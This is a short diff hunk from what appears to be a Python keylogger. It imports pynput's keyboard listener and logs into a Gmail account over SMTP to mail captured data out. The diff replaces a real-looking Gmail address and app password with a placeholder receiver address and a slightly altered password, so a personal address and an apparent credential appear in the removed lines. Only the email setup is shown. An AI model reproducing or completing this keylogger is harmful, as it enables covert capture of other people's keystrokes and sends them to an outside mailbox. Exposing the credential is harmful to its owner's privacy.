@@ -2,8 +2,8 @@ import smtplib
 import subprocess
 
 from pynput.keyboard import Key, Listener
-email = 'svelaravindhan@gmail.com'
-password = 'cigs wmzl mmwm ckdg'
+email = 'Reciver Id @gmail.com'    #reciver mail id
+password = 'cjgs wmml mmwm kkdg'
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login(email, password)
 
